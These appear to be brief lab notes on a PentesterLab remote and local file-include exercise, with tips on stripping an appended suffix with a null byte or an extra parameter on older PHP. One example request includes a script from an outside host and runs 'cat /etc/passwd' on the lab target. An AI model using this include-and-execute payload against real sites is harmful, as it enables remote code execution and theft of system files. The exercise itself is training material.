File Include

Test page for File Include
http://assets.pentesterlab.com/test_include.txt


Malicious script
http://assets.pentesterlab.com/test_include_system.txt
Örnek: https://ptl-afd0e69f9700-abbce6b443a2.libcurl.me/?page=http://assets.pentesterlab.com/test_include_system.txt&c=cat%20/etc/passwd


In a similar manner to Directory Traversal, this example adds its own suffix to the value provided.
As before, you can get rid of the suffix (for LFI) using a NULL BYTE.
For RFI, you can get rid of the suffix, by adding &blah= or ?blah= depending on your URL.
In this exercise, the code simulates the behaviour of older versions of PHP.
PHP now correctly handles paths, and they cannot be poisoned using a NULL BYTE, as they used to.
